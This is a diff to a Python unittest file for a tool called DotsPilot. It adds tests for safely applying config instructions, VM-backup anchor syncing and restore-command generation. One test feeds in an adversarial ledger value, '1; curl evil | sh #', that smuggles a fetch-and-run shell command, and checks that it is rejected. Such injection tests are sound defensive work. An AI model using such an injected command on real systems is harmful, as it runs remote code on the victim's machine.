@@ -573,7 +573,7 @@ class DotsPilotTests(unittest.TestCase):
 
             # Version alignment, ANSI/quoted/PGP redaction, systemd escaping & injection block,
             # non-dict/corrupt JSON guards, and read-only status
-            self.assertEqual(dp.VERSION, "1.3.1")
+            self.assertEqual(dp.VERSION, "1.4.0")
             self.assertEqual(dp._redact_text("Bearer \x1b[31msecret1234567890abcdef\x1b[0m"), "[REDACTED]")
             self.assertEqual(dp._redact_text('API_KEY="tok part2 secret"'), "[REDACTED]")
             self.assertEqual(
@@ -818,6 +818,215 @@ class DotsPilotTests(unittest.TestCase):
             capture_output=True, text=True, check=False,
         )
         self.assertEqual(ack_res.returncode, 0, ack_res.stderr)
+
+    def test_v140_wgpt_instructions_vm_backup_and_pilot_recovery_integration(self):
+        # 1) Render / check / dry-run / apply wgpt-daemon mcp.instructions safely
+        rend = run_pilot(["wgpt-instructions", "render", "--dot", "REV18", "--project", "app", "--json"], self.pilot_dir)
+        self.assertEqual(rend.returncode, 0, rend.stderr)
+        rdoc = json.loads(rend.stdout)
+        self.assertLessEqual(rdoc["chars"], 3800)
+        self.assertLess(rdoc["chars"], 4000)
+        self.assertIn("REV18", rdoc["text"])
+
+        wgpt_dir = os.path.join(self.tmp, "wgpt-data")
+        os.makedirs(wgpt_dir, mode=0o700, exist_ok=True)
+        wgpt_cfg = os.path.join(wgpt_dir, "config.json")
+        orig_wgpt = {
+            "tunnel": {"profileId": "p1"},
+            "goal": {"enabled": False, "model": "approved-placeholder"},
+            "roots": [{"name": "repo", "path": wgpt_dir}],
+            "mcp": {"instructions": "", "extra": 42},
+        }
+        _write_json(wgpt_cfg, orig_wgpt)
+        os.chmod(wgpt_cfg, 0o600)
+
+        chk_before = run_pilot(
+            ["wgpt-instructions", "check", "--config", wgpt_cfg, "--dot", "REV18", "--project", "app", "--json"],
+            self.pilot_dir,
+        )
+        self.assertEqual(chk_before.returncode, 2)
+        self.assertFalse(json.loads(chk_before.stdout)["ok"])
+
+        dry = run_pilot(
+            ["wgpt-instructions", "apply", "--config", wgpt_cfg, "--dot", "REV18", "--project", "app", "--dry-run", "--json"],
+            self.pilot_dir,
+        )
+        self.assertEqual(dry.returncode, 0, dry.stderr)
+        self.assertEqual(json.loads(pathlib.Path(wgpt_cfg).read_text(encoding="utf-8"))["mcp"]["instructions"], "")
+
+        app = run_pilot(
+            ["wgpt-instructions", "apply", "--config", wgpt_cfg, "--dot", "REV18", "--project", "app", "--json"],
+            self.pilot_dir,
+        )
+        self.assertEqual(app.returncode, 0, app.stderr)
+        app_out = json.loads(app.stdout)
+        self.assertTrue(app_out["ok"])
+        self.assertTrue(os.path.isfile(app_out["backup"]))
+        updated_doc = json.loads(pathlib.Path(wgpt_cfg).read_text(encoding="utf-8"))
+        self.assertEqual(updated_doc["tunnel"], {"profileId": "p1"})
+        self.assertEqual(updated_doc["goal"], {"enabled": False, "model": "approved-placeholder"})
+        self.assertEqual(updated_doc["mcp"]["extra"], 42)
+        self.assertEqual(updated_doc["mcp"]["instructions"], rdoc["text"])
+        self.assertEqual(stat.S_IMODE(os.lstat(wgpt_cfg).st_mode), 0o600)
+
+        chk_after = run_pilot(
+            ["wgpt-instructions", "check", "--config", wgpt_cfg, "--dot", "REV18", "--project", "app", "--json"],
+            self.pilot_dir,
+        )
+        self.assertEqual(chk_after.returncode, 0, chk_after.stderr)
+        self.assertTrue(json.loads(chk_after.stdout)["ok"])
+
+        sym_cfg = os.path.join(wgpt_dir, "sym_config.json")
+        os.symlink(wgpt_cfg, sym_cfg)
+        self.assertNotEqual(run_pilot(["wgpt-instructions", "apply", "--config", sym_cfg], self.pilot_dir).returncode, 0)
+
+        # 2) vm-backup status, anchor-inside-ops rejection, sync-anchor double-read guard, restore-cmd, and pilot once integration
+        rec_dir = os.path.join(self.tmp, "recovery-kit")
+        os.makedirs(rec_dir, mode=0o700, exist_ok=True)
+        rec_script = os.path.join(rec_dir, "recovery.py")
+        rec_code = (
+            "import json\n"
+            "def identity(root):\n"
+            "    return (root / 'uuid.txt').read_text().strip()\n"
+            "def inspect(root):\n"
+            "    return json.loads((root / 'jobs.json').read_text())\n"
+        )
+        pathlib.Path(rec_script).write_text(rec_code, encoding="utf-8")
+        rec_sha = dp._sha256_file(rec_script)
+        uuid_val = "83df0c08-09cd-4466-a280-c6f3248b5178"
+        pathlib.Path(os.path.join(rec_dir, "uuid.txt")).write_text(uuid_val + "\n", encoding="utf-8")
+        jobs_file = os.path.join(rec_dir, "jobs.json")
+        _write_json(jobs_file, {})
+
+        anchor_dir = os.path.join(self.tmp, "external-anchors")
+        bad_anchor_inside = os.path.join(self.ops_base, "nested-anchor", "sub")
+        self.assertNotEqual(
+            run_pilot([
+                "init", "--dot", "DOT-V", "--project", "vproj", "--ops-base", self.ops_base,
+                "--recovery-script", rec_script, "--recovery-sha256", rec_sha,
+                "--recovery-ledger", rec_dir, "--recovery-anchor-dir", bad_anchor_inside,
+            ], self.pilot_dir).returncode,
+            0,
+        )
+        self.assertFalse(os.path.exists(os.path.join(self.ops_base, "nested-anchor")))
+
+        notify_log = os.path.join(self.tmp, "vm-notify.log")
+        notify_cmd = [sys.executable, "-c", "import pathlib,sys; pathlib.Path(sys.argv[1]).write_text(sys.argv[2]+'\\n')", notify_log, "{text}"]
+        r_init = run_pilot([
+            "init", "--dot", "DOT-V", "--project", "vproj", "--ops-base", self.ops_base,
+            "--preset", "generic", "--force",
+            "--recovery-script", rec_script, "--recovery-sha256", rec_sha,
+            "--recovery-ledger", rec_dir, "--recovery-anchor-dir", anchor_dir,
+            "--idle-max-age-min", "720",
+            "--notify-mode", "command", "--notify-cmd", json.dumps(notify_cmd),
+        ], self.pilot_dir)
+        self.assertEqual(r_init.returncode, 0, r_init.stderr)
+
+        doc_chk = run_pilot(["doctor", "--json"], self.pilot_dir)
+        self.assertEqual(doc_chk.returncode, 0, doc_chk.stdout)
+        doc_map = {c["check"]: c["ok"] for c in json.loads(doc_chk.stdout)["checks"]}
+        self.assertTrue(doc_map["recovery_pin"])
+        self.assertTrue(doc_map["recovery_ledger"])
+        self.assertTrue(doc_map["recovery_anchor"])
+
+        # Add an active VM job -> status shows ANCHOR_MISSING -> once emits PILOT_VM_WARN & notifies -> sync-anchor fixes it
+        _write_json(jobs_file, {
+            "job-vm-1": {
+                "phase": "ACTIVE", "rev": 2, "head": "abc123head", "stage": "prep",
+                "next_stage": "render", "environment": "env-1", "generation": "gen-1", "attempt": 1, "recoveries": 0,
+            }
+        })
+        st1 = json.loads(run_pilot(["vm-backup", "status", "--json"], self.pilot_dir).stdout)
+        self.assertEqual(st1["parity"], "ANCHOR_MISSING")
+
+        once1 = run_pilot(["once", "--verbose"], self.pilot_dir)
+        self.assertEqual(once1.returncode, 0, once1.stderr)
+        self.assertIn("PILOT_VM_WARN WATCH_VM_ANCHOR_MISSING DOT-V job-vm-1", once1.stdout)
+        self.assertIn("WATCH_VM_ANCHOR_MISSING", pathlib.Path(notify_log).read_text(encoding="utf-8"))
+
+        sync1 = json.loads(run_pilot(["vm-backup", "sync-anchor", "--json"], self.pilot_dir).stdout)
+        self.assertTrue(sync1["ok"])
+        self.assertEqual(sync1["job_count"], 1)
+        self.assertTrue(any(f.endswith("/job-job-vm-1.json") for f in sync1["job_files"]))
+        st2 = json.loads(run_pilot(["vm-backup", "status", "--json"], self.pilot_dir).stdout)
+        self.assertEqual(st2["parity"], "MATCH")
+
+        # Loose permissions on anchor.json (0644) must not be trusted -> status falls back to ANCHOR_MISSING/DRIFT
+        os.chmod(sync1["anchor_path"], 0o644)
+        st_loose = json.loads(run_pilot(["vm-backup", "status", "--json"], self.pilot_dir).stdout)
+        self.assertNotEqual(st_loose["parity"], "MATCH")
+        os.chmod(sync1["anchor_path"], 0o600)
+
+        # Job named 'anchor' must not collide with anchor.json
+        _write_json(jobs_file, {
+            "anchor": {"phase": "ACTIVE", "rev": 1, "head": "h-anc", "attempt": 0}
+        })
+        sync_anc = json.loads(run_pilot(["vm-backup", "sync-anchor", "--json"], self.pilot_dir).stdout)
+        self.assertTrue(any(f.endswith("/job-anchor.json") for f in sync_anc["job_files"]))
+        self.assertEqual(json.loads(run_pilot(["vm-backup", "status", "--json"], self.pilot_dir).stdout)["parity"], "MATCH")
+
+        # Adversarial rev/attempt/store_uuid in ledger rejected in restore-cmd
+        _write_json(jobs_file, {
+            "job-vm-1": {"phase": "ACTIVE", "rev": "1; curl evil | sh #", "head": "abc", "attempt": 1}
+        })
+        bad_rcmd = run_pilot(["vm-backup", "restore-cmd", "--job", "job-vm-1"], self.pilot_dir)
+        self.assertNotEqual(bad_rcmd.returncode, 0)
+        _write_json(jobs_file, {
+            "job-vm-1": {"phase": "ACTIVE", "rev": 2, "head": "abc123head", "attempt": 1, "stage": "prep", "next_stage": "render"}
+        })
+
+        rcmd = json.loads(run_pilot(["vm-backup", "restore-cmd", "--job", "job-vm-1", "--json"], self.pilot_dir).stdout)
+        self.assertTrue(any("preview job-vm-1 2 1 job-vm-1-preview" in c for c in rcmd["commands"]))
+
+        # Live recovery.py inspect() 'revision' schema + dotted/colon job ID preview_name sanitization + --no-apply-tracks
+        _write_json(jobs_file, {
+            "job.vm:1": {"phase": "ACTIVE", "revision": 4, "head": "abc444", "attempt": 2, "next_stage": "verify"}
+        })
+        st_rev = json.loads(run_pilot(["vm-backup", "status", "--json"], self.pilot_dir).stdout)
+        self.assertEqual(st_rev["jobs"]["job.vm:1"]["rev"], 4)
+        rcmd_dot = json.loads(run_pilot(["vm-backup", "restore-cmd", "--job", "job.vm:1", "--json"], self.pilot_dir).stdout)
+        self.assertTrue(any("preview job.vm:1 4 2 job-vm-1-preview" in c for c in rcmd_dot["commands"]))
+        rcmd_ok = json.loads(run_pilot(["vm-backup", "restore-cmd", "--job", "job.vm:1", "--preview-name", "good_prev-1", "--json"], self.pilot_dir).stdout)
+        self.assertTrue(any("preview job.vm:1 4 2 good_prev-1" in c for c in rcmd_ok["commands"]))
+        self.assertNotEqual(run_pilot(["vm-backup", "restore-cmd", "--job", "job.vm:1", "--preview-name", ""], self.pilot_dir).returncode, 0)
+        self.assertNotEqual(run_pilot(["vm-backup", "restore-cmd", "--job", "job.vm:1", "--preview-name", "-bad"], self.pilot_dir).returncode, 0)
+
+        no_trk_ops = os.path.join(self.tmp, "ops-no-tracks")
+        no_trk_pilot = os.path.join(self.tmp, "pilot-no-tracks")
+        os.makedirs(no_trk_ops, mode=0o700, exist_ok=True)
+        r_nt = run_pilot([
+            "init", "--dot", "DOT-NT", "--project", "ntproj", "--ops-base", no_trk_ops,
+            "--no-apply-tracks",
+        ], no_trk_pilot)
+        self.assertEqual(r_nt.returncode, 0, r_nt.stderr)
+        self.assertIn("PILOT_TRACKS_SKIPPED DOT-NT", r_nt.stdout)
+        self.assertFalse(os.path.exists(os.path.join(no_trk_ops, "loops")))
+        once_nt = run_pilot(["once", "--verbose"], no_trk_pilot)
+        self.assertEqual(once_nt.returncode, 0, once_nt.stderr)
+        self.assertIn("PILOT_TICK dot=DOT-NT", once_nt.stdout)
+        self.assertEqual(dp._format_wake_nudge("DOT-NT", "ntproj", [{"kind": "wake", "agent": "w1"}], has_loops=False).count("loop claim"), 0)
+        self.assertEqual(dp._format_wake_nudge("DOT-NT", "ntproj", [{"kind": "wake", "agent": "w1"}], has_loops=True).count("loop claim"), 1)
+
+        # Double-read window drift detection in vm-backup sync-anchor
+        flaky_script = os.path.join(rec_dir, "flaky_recovery.py")
+        flaky_code = (
+            "_n = 0\n"
+            "def identity(root):\n"
+            "    return '83df0c08-09cd-4466-a280-c6f3248b5178'\n"
+            "def inspect(root):\n"
+            "    global _n\n"
+            "    _n += 1\n"
+            "    return {'j1': {'phase': 'ACTIVE', 'rev': _n, 'head': f'h{_n}'}}\n"
+        )
+        pathlib.Path(flaky_script).write_text(flaky_code, encoding="utf-8")
+        flaky_sha = dp._sha256_file(flaky_script)
+        drift_res = run_pilot([
+            "vm-backup", "sync-anchor",
+            "--recovery-script", flaky_script, "--recovery-sha256", flaky_sha,
+            "--ledger-dir", rec_dir, "--anchor-dir", anchor_dir, "--dot", "DOT-V",
+        ], self.pilot_dir)
+        self.assertEqual(drift_res.returncode, 2)
+        self.assertIn("single-writer read window", drift_res.stderr)
 
 
 if __name__ == "__main__":
